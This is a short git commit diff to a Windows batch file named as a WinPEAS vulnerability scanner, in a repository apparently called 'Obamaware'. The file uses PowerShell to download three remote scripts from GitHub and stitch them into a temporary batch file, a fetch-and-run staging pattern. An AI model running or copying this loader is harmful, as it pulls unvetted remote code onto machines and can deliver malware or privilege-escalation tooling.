029e6f55a2c96ba6d95e5321330bb7fc139abf16
RaupenInspektor <viktorfranzen@gmx.de>
2025-10-19 13:55:17 +0200

    .

--- VulnScanners/winPeasScanner.bat
+++ VulnScanners/winPeasScanner.bat
@@ -1,4 +1,4 @@
-New-Item ./temp_scanner.bat
+powershell.exe -Command New-Item ./temp_scanner.bat
 powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n.ps1").Content -Path "./temp_scanner.bat"
 powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n2.ps1").Content -Path "./temp_scanner.bat"
 powershell.exe -Command Add-Content -Value (iwr -Uri "https://github.com/RaupenInspektor/Obamaware/raw/main/VulnScanners/n3.ps1").Content -Path "./temp_scanner.bat"
